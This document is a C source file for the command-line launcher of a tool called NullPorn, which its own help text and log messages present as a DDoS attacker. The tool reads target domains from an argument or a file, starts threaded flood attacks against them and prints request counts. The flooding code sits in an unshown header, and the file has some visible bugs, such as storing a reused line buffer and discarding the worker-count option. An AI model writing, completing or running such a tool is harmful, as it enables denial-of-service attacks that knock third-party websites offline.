#define STB_DS_IMPLEMENTATION

#include <NullPorn.h>
#include <stb_ds.h>

#include <stdio.h>
#include <getopt.h>

static void Logo()
{
    printf(" _______         __ __ ______                   \n");
    printf("|    |  |.--.--.|  |  |   __ \\.-----.----.-----.\n");
    printf("|       ||  |  ||  |  |    __/|  _  |   _|     |\n");
    printf("|__|____||_____||__|__|___|   |_____|__| |__|__|\n");
    printf("               --- Hachem H. ---                \n");
    printf("\n");
}

static void Help()
{
    Logo();
    printf("Usage:\n");
    printf("$ NullPorn-CLI -[d] <domain> -n <amount of workers>\n");
    printf("$ NullPorn-CLI -[D] <file> -n <amount of workers>\n\n");
    printf("Arguments:\n");
    printf("    -d <domain>         : attack a domain.\n");
    printf("    -D <file>           : attack a collection of domains found in a file.\n");
    printf("    -n <workers count>  : amount of threads used per domain.\n");
    printf("    -h                  : help and usage.\n\n");
}

static bool ParseFile(char* filepath, char** urls)
{
    FILE* file = fopen(filepath, "r");
    if (!file)
    {
        fprintf(stderr, "[ERR @ %s]: Could not open file.\n", filepath);
        return false;
    }

    char line[256];
    while (fgets(line, sizeof(line), file) != NULL)
    {
        line[strcspn(line, "\n")] = '\0';
        arrpush(urls, line);
    }

    fclose(file);
    return true;
}

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        Help();
        exit(EXIT_FAILURE);
    }

    int options;

    char** urls = NULL;
    int workerCount = 0;

    while ((options = getopt(argc, argv, "D:d:n:")) != -1) 
    {
        switch (options) 
        {
            case 'd':
                char* url = optarg;
                arrpush(urls, url);
                break;
            case 'D':
                char* path = optarg;
                if (!ParseFile(path, urls))
                    exit(EXIT_FAILURE);
                break;
            case 'n':
                workerCount = atoi(optarg);
                break;

            default:
                Help();
                exit(EXIT_FAILURE);
        }
    }

    workerCount = arrlen(urls);
    DDoS attacks[workerCount];

    for (int i = 0; i < workerCount; i++)
    {
        CreateAttack(&attacks[i], urls[i], workerCount);
        RunAttack(&attacks[i]);
    }

    Logo();
    printf("[INFO @ DDoS STARTED]: To stop, press RETURN).");

    (void)getchar();
    for (int i = 0; i < workerCount; i++)
        StopAttack(&attacks[i]);
    arrfree(urls);

    int successfulRequests = 0;
    int totalRequests = 0;

    for (int i = 0; i < workerCount; i++)
    {
        successfulRequests += attacks[i].data->successfulRequests;
        totalRequests += attacks[i].data->totalRequests;
    }

    printf("[INFO @ DDoS DONE]:\n");
    printf("    Total Requests:      %d\n", totalRequests);
    printf("    Successful Requests: %d\n", successfulRequests);
}